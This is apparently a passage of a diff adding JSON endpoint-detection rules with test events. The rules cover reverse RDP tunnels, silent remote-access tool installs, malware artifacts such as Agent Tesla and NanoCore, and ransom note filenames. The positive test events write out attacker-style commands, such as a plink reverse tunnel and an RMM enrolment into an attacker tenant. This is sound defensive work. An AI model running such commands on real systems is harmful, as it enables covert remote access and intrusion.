+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(plink|ssh)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-R\\s+\\S*:?3389\\b|\\s-R\\s+\\d+:(127\\.0\\.0\\.1|localhost):3389"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "fox-kitten",
+    "tunnel"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\Public\\plink.exe",
+      "command": "plink.exe -ssh -l u -pw p -R 2222:127.0.0.1:3389 203.0.113.20"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\Public\\plink.exe",
+      "command": "plink.exe -ssh host -L 8080:127.0.0.1:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-rmm-atera-msi-integrator",
+   "name": "Atera agent MSI installed with integrator login",
+   "description": "msiexec with IntegratorLogin=/CompanyId= silently enrols the host into an attacker Atera tenant, reported by CISA for Iran-nexus and criminal actors.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\msiexec.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "integratorlogin="
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "companyid="
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "rmm",
+    "atera",
+    "muddywater"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /i setup.msi /qn IntegratorLogin=a@b.c CompanyId=1 AccountId=0013"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /i setup.msi /qn"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-rmm-screenconnect-offpath",
+   "name": "ScreenConnect client running outside its install directory",
+   "description": "ScreenConnect (ConnectWise) client binaries from user-writable paths, a technique documented for MuddyWater and criminal intrusion sets. Managed-service use is common, so low.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\screenconnect\\.(client|windowsclient|clientservice)\\w*\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "rmm",
+    "screenconnect",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\ScreenConnect.WindowsClient.exe",
+      "command": "ScreenConnect.WindowsClient.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\ScreenConnect Client (abc)\\ScreenConnect.ClientService.exe",
+      "command": "ScreenConnect.ClientService.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-rmm-simplehelp-jwrapper",
+   "name": "SimpleHelp remote-access client from JWrapper",
+   "description": "JWrapper-Remote Access (SimpleHelp) executables in ProgramData or user paths. Abused by Iran-nexus and ransomware actors; MSP use is legitimate, so low.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\jwrapper-remote access\\",
+       "\\simpleservice.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "rmm",
+    "simplehelp",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\ProgramData\\JWrapper-Remote Access\\JWAppsSharedConfig\\SimpleService.exe",
+      "command": "SimpleService.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command": "notepad.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-rmm-anydesk-silent-install",
+   "name": "AnyDesk silent install with unattended access",
+   "description": "AnyDesk --install with --silent and --start-with-win or --set-password configures unattended access, a pre-ransomware step reported across regions.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\anydesk.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "--install"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "--silent"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--(start-with-win|set-password|remove-first)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "rmm",
+    "anydesk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\Downloads\\AnyDesk.exe",
+      "command": "AnyDesk.exe --install \"C:\\ProgramData\\AnyDesk\" --start-with-win --silent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
+      "command": "AnyDesk.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-rmm-netsupport-client32",
+   "name": "NetSupport Manager client from user-writable path",
+   "description": "client32.exe beside NSM.lic or client32.ini in AppData/ProgramData/Temp, used by NetSupport RAT campaigns.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\client32.exe"
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "rmm",
+    "netsupport"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Roaming\\Mx\\client32.exe",
+      "command": "client32.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\NetSupport\\NetSupport School\\client32.exe",
+      "command": "client32.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-bitlocker-protector-add",
+   "name": "BitLocker protector added with recovery password on a data volume",
+   "description": "manage-bde adding recovery-password protectors and enabling encryption was reported by CISA in Iran-nexus ransomware cooperation. Admin and MDM use is common, so low.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\manage-bde.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-protectors"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-add"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "recoverypassword"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "ransomware",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\manage-bde.exe",
+      "command": "manage-bde -protectors -add D: -RecoveryPassword 123456"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\manage-bde.exe",
+      "command": "manage-bde -status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-agenttesla-schtask-xml",
+   "name": "Agent Tesla style task from a temp XML",
+   "description": "schtasks /Create /TN \"Updates\\<name>\" /XML tmp<hex>.tmp from %TEMP% is the Agent Tesla persistence routine. Agent Tesla, NanoCore and LokiBot are the long-running West African BEC toolset.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\schtasks.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/create"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "updates\\"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/xml\\s+\\\"?[a-z]:\\\\.*\\\\temp\\\\tmp[0-9a-f]+\\.tmp"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "agent-tesla"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks.exe /Create /TN \"Updates\\xYzKl\" /XML \"C:\\Users\\ann\\AppData\\Local\\Temp\\tmp9F3A.tmp\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks.exe /Create /TN Backup /XML C:\\ops\\backup.xml"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-nanocore-datafiles",
+   "name": "NanoCore run.dat or catalog.dat in a GUID folder",
+   "description": "NanoCore keeps run.dat and catalog.dat under %APPDATA%\\<GUID>\\.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\appdata\\\\roaming\\\\\\{?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\}?\\\\(run|catalog)\\.dat$"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "nanocore"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\A1B2C3D4-1111-2222-3333-444455556666\\run.dat",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Vendor\\run.dat",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-nanocore-task-names",
+   "name": "NanoCore monitor-style scheduled task names",
+   "description": "NanoCore commonly registers tasks named like DHCP Monitor, UPnP Monitor, WAN Monitor, NTFS Subsystem or SMTP Service from user-writable binaries.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\schtasks.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/create"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/tn\\s+\\\"?(dhcp|upnp|wan|tcp|smtp|ntfs)\\s+(monitor|service|subsystem)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "nanocore"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /f /tn \"DHCP Monitor\" /xml C:\\Users\\ann\\AppData\\Local\\Temp\\tmp1.tmp"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /tn Backup /tr c:\\b.cmd /sc daily"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-lokibot-appdata-files",
+   "name": "LokiBot .lck/.hdb/.kdb files in AppData",
+   "description": "LokiBot creates six-hex-character folders with .lck, .hdb and .kdb files under %APPDATA% for locking and credential cache.",
+   "tactic": "Credential Access",
+   "technique": "T1555",
+   "technique_name": "Credentials from Password Stores",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\appdata\\\\roaming\\\\[0-9a-f]{6}\\\\[0-9a-f]{6}\\.(lck|hdb|kdb)$"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "lokibot"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\A1B2C3\\D4E5F6.hdb",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\A1B2C3\\D4E5F6.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-netwire-registry",
+   "name": "NetWire registry configuration key",
+   "description": "NetWire RAT stores configuration under HKCU\\Software\\NetWire. A Nigerian-linked BEC staple.",
+   "tactic": "Defense Evasion",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "contains",
+      "pattern": "\\software\\netwire"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "netwire"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\NetWire",
+       "value_name": "HostId",
+       "value_data": "Abc",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\NetworkWire",
+       "value_name": "x",
+       "value_data": "y",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-afr-hollowing-host-from-userdir",
+   "name": "Injection-target .NET binary launched by a user-writable parent",
+   "description": "RegAsm, RegSvcs, MSBuild, InstallUtil, vbc or jsc spawned by a process in AppData, ProgramData, Public or Temp, the hollowing pattern of Agent Tesla, FormBook and NanoCore loaders.",
+   "tactic": "Defense Evasion",
+   "technique": "T1055.012",
+   "technique_name": "Process Hollowing",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\regasm.exe",
+       "\\regsvcs.exe",
+       "\\installutil.exe",
+       "\\vbc.exe",
+       "\\jsc.exe"
+      ]
+     },
+     {
+      "field": "parent_exe",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "afr",
+    "bec",
+    "hollowing"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe",
+      "command": "RegAsm.exe",
+      "parent_exe": "C:\\Users\\ann\\AppData\\Roaming\\inv.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe",
+      "command": "RegAsm.exe",
+      "parent_exe": "C:\\Program Files\\Setup\\setup.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-clop-note",
+   "name": "Clop ransom note",
+   "description": "Creation of the Clop ransom note file name(s) ClopReadMe.txt. Clop operators are Russian-speaking and avoid CIS systems; victims span NA and EU file-transfer-appliance customers.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\ClopReadMe.txt",
+       "/ClopReadMe.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "clop"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\ClopReadMe.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-cuba-note",
+   "name": "Cuba ransom note",
+   "description": "Creation of the Cuba ransom note file name(s) !!FAQ for Decryption!!.txt. Cuba ransomware has mostly hit the Americas and Europe (CISA AA22-335A).",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\!!FAQ for Decryption!!.txt",
+       "/!!FAQ for Decryption!!.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "cuba"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\!!FAQ for Decryption!!.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-ryuk-note",
+   "name": "Ryuk ransom note",
+   "description": "Creation of the Ryuk ransom note file name(s) RyukReadMe.txt, RyukReadMe.html. Ryuk (Russian-speaking Wizard Spider) targeted NA and European healthcare and enterprise.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\RyukReadMe.txt",
+       "\\RyukReadMe.html",
+       "/RyukReadMe.txt",
+       "/RyukReadMe.html"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "ryuk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\RyukReadMe.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-babuk-note",
+   "name": "Babuk ransom note",
+   "description": "Creation of the Babuk ransom note file name(s) How To Restore Your Files.txt. Babuk's leaked builder has spawned many regional variants, including ESXi lockers.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\How To Restore Your Files.txt",
+       "/How To Restore Your Files.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "babuk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\How To Restore Your Files.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-lockbit3-note",
+   "name": "LockBit 3.0 ransom note",
+   "description": "Creation of the LockBit 3.0 ransom note file name(s) Restore-My-Files.txt. LockBit is the most prolific RaaS; CERT-JP, ACSC and others published advisories on it.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\Restore-My-Files.txt",
+       "/Restore-My-Files.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "lockbit-3.0"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\Restore-My-Files.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-alphv-note",
+   "name": "ALPHV/BlackCat ransom note",
+   "description": "Creation of the ALPHV ransom note file name(s) RECOVER-FILES.txt. Rust-based RaaS; observed in the Americas, Europe and APAC.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\RECOVER-FILES.txt",
+       "/RECOVER-FILES.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "alphv"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\RECOVER-FILES.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-medusa-note",
+   "name": "Medusa ransom note",
+   "description": "Creation of the Medusa ransom note file name(s) !!!READ_ME_MEDUSA!!!.txt. Medusa has hit organisations worldwide including Latin America and Europe.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\!!!READ_ME_MEDUSA!!!.txt",
+       "/!!!READ_ME_MEDUSA!!!.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "medusa"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\!!!READ_ME_MEDUSA!!!.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-rhysida-note",
+   "name": "Rhysida ransom note",
+   "description": "Creation of the Rhysida ransom note file name(s) CriticalBreachDetected.pdf. Rhysida incidents include the 2023 Chilean Army breach and European public bodies (CISA AA23-319A).",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\CriticalBreachDetected.pdf",
+       "/CriticalBreachDetected.pdf"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "rhysida"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\CriticalBreachDetected.pdf",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-blackbyte-note",
+   "name": "BlackByte ransom note",
+   "description": "Creation of the BlackByte ransom note file name(s) BlackByte_restoremyfiles.hta. BlackByte reuses ProxyShell-era access; victims in NA, EU and APAC.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\BlackByte_restoremyfiles.hta",
+       "/BlackByte_restoremyfiles.hta"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "blackbyte"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\BlackByte_restoremyfiles.hta",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-akira-note",
+   "name": "Akira ransom note",
+   "description": "Creation of the Akira ransom note file name(s) akira_readme.txt. CERT-In issued a July 2023 advisory on Akira for Windows and Linux/ESXi.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\akira_readme.txt",
+       "/akira_readme.txt"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "akira"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\akira_readme.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-trigona-note",
+   "name": "Trigona ransom note",
+   "description": "Creation of the Trigona ransom note file name(s) how_to_decrypt.hta. Trigona victims are reported across Latin America, Europe and APAC.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\how_to_decrypt.hta",
+       "/how_to_decrypt.hta"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "trigona"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\how_to_decrypt.hta",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-phobos-note",
+   "name": "Phobos/8Base/Dharma ransom note",
+   "description": "Creation of the Phobos ransom note file name(s) info.hta. Phobos-family lockers (also 8Base, Dharma) hit small organisations globally with RDP-led access.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\info.hta",
+       "/info.hta"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "phobos"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\info.hta",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-revil-note",
+   "name": "REvil/Sodinokibi ransom note",
+   "description": "REvil: a random-prefixed -readme.txt note. REvil deliberately skips CIS keyboard layouts, a documented Russian-speaking regional tell.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "[\\\\/][a-z0-9]{5,12}-readme\\.txt$"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ransomware",
+    "revil"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\a1b2c3d4-readme.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\project-notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-rw-blackbasta-wallpaper",
+   "name": "Black Basta wallpaper and icon resources",
